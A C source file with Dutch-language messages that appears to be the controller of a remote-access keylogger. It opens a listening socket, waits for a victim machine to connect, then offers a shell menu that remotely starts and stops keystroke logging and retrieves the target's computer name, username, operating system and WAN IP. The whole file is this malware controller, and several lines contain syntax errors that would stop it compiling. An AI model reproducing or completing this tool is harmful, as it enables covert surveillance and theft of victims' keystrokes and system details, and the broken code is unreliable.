#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <arpa/inet.h>

struct sockaddr_in serv_addr, cli_addr;
int sock_fd=0, newsock_fd=0,clilen=0,n=0;

void ErrorMessage(const char *msg) {
	perror(msg);
}

int Shell() {

	char command[1024];
	char help[1024] = "help";
	char close[1024] = "close";
	char info[1024] = "info";
	char clear[1024] = "clear";
	char print[1024] = "print";

	char start_log[1024] = "start_log";
	char stop_log[1024] = "stop_log";
	char output[1024];
	int is_running = 0;

	char HELP[1024] = "\n\n   [ HELP MENU ]\n   [ Help - Print dit menu ]\n   [ Close - Sluit de Connectie ]\n   [ Info - Vraag Target Info Op ]\n   [ Clear - Cleared De Terminal ]\n   [ start_log - Begin de Keylogger ]\n   [ stop_log - Stop de Keylogger ]   [ HELP MENU]\n\n";

	char COMPUTER[1024];
	char USER[1024];
	char OS[1024];
	char WANIP[1024];

	char *p=getenv("USER");
	sleep(1);

	printf("	[>>] Shell sessie geopend!\n");

	while(1) {

			printf(" [>>] %s@%s:~$ ", p, inet_ntoa(cli_addr.sin_addr));
			bzero(command, 1024);
			fgets(command, 1024, stdin);

			if(strncmp(command, help, strlen(help)) == 0) {
					printf(HELP);
			}

			else if(strncmp(command, close, strlen(close)) == 0) {
					n = write(newsock_fd, close, strlen(close));
					printf("	[>>] Aan het Sluiten. ");
					exit(1);
			}

			else if(strncmp(command, start_log, strlen(start_log)) == 0) {
				if (is_running == 0) {
					printf("   [>> Logging Sessie Is Gestart\n");	
					n = write(newsock_fd, start_log, strlen(start_log));	
					n = read(newsock_fd, output, 1024);
					if(strncmp(output, "START", 5) == 0) {
						printf("   [>>] Het Loggen Is begonnen!\n");
					is_running = 1;
					}
					
					else {
						printf("   [>>] Het Loggen Is Verkeerd Gegaan\n");
					}
				}

				else if (is_running == 1) {
					printf("   [>>] De Logger Runt Al!\n")
				}
				
				bzero(output, 1024);
			}

			else if(strncmp(command, stop_log, strlen(stop_log)) == 0) {
				if (is_running == 1) {
					printf("   [>>] Logging Sessie Wordt Gestopt\n");
					n = write(newsock_fd, stop_log, strlen(stop_log));
					n = read(newsock_fd, output, 1024);
					if (strncmp(output, "STOP", 4 == 0) {
						printf("   [>>] Loggen is Gestopt!\n");
					is_running = 0;
					}
				}
					
					else {
						printf("   [>>] Fout Bij het Stoppen Van Loggen!\n");
					}
				else if (is_running == 0) {
					printf("   [>>] De Logger Runt Niet!\n");
				}

				bzero(output, 1024);
			}



			else if(strncmp(command, info, strlen(info)) == 0) {
					bzero(command, 1024);
					printf("	[>>] Aan het wachten voor Info.\n");
		

					if(n<0)
							ErrorMessage("	[!!] Fout met schrijven naar Socket!\n");

					n = read(newsock_fd, COMPUTER, 1024);
					n = read(newsock_fd, USER, 1024);
					n = read(newsock_fd, OS, 1024);
					n = read(newsock_fd, WANIP, 1024);

					printf(" 	Computernaam 	-- %s\n", COMPUTER);
					printf(" 	Gebruikersnaam  -- %s\n", USER);
					printf(" 	Operating Sys 	-- %s\n", OS);
					printf(" 	WAN IP		-- %s\n", WANIP);

			}

			else if(strncmp(command, clear, strlen(clear)) == 0) {
					system("clear");
			}

			else {
					printf(" 	[!!] Ongeldig Commando!\n");
			}
	  }
}





int Server(){

		char ports[1024];
		int pid;
		int optval = 1;
		sock_fd=socket(AF_INET,SOCK_STREAM, 0);
		int i;

		if(setsockopt(sock_fd, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval)) <0) {
				printf("	[!!] Error voor het zetten van TCP Socket Opties!\n");
				return 1;
		}

		if (sock_fd<0)
			fprintf(stderr,"	[!!] Error Bij Het Openen Van De Socket Handle!\n");

		bzero((char *) &serv_addr, sizeof(serv_addr));

		printf(" 	[>>] Voer Het Port In Waar Connectie Geaccepteert Moeten Worden: ");
		fgets(ports, BUFSIZ, stdin);

		int port = atoi(ports);

		serv_addr.sin_family=AF_INET;
		serv_addr.sin_port = htons(port);
		serv_addr.sin_addr.s_addr = INADDR_ANY;

		if (bind(sock_fd, (struct sockaddr *) &serv_addr, sizeof(serv_addr)) <0)
				ErrorMessage(" 	[!!] Fout Bij Binding!\n");

		listen(sock_fd, 5);

		printf("	[>>] Wachten Voor Inkomende Connecties...\n");

		clilen = sizeof(cli_addr);

		newsock_fd = accept(sock_fd, (struct sockaddr *) &cli_addr, &clilen);

		if(newsock_fd<0)
				printf(" 	[!!] Error Bij Het Accepteren Van De Connectie!\n");

		printf(" 	[>>] Connectie Van %s!\n", inet_ntoa(cli_addr.sin_addr));
		printf(" 	[>>] Beginnen Met Shellsessie!\n");
		Shell();
		return 0;

}


int main(void) {

		Server();
}


